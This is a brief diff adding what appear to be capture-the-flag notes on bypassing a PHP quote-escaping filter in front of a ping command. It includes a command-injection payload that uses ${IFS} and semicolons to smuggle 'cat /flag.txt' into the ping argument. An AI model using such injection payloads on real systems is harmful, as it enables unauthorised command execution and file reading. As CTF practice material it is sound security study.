@@ -1,0 +1,7 @@
+ip = \';${IFS}cat${IFS}/flag.txt;\'${IFS}
+
+$ip = str_replace("'", "\\'", $ip);
+
+ping -c1 -t1 '$ip'
+
+#turns to: ping -c1 -t1 '\\';${IFS}cat${IFS}/flag.txt;\\'${IFS}'
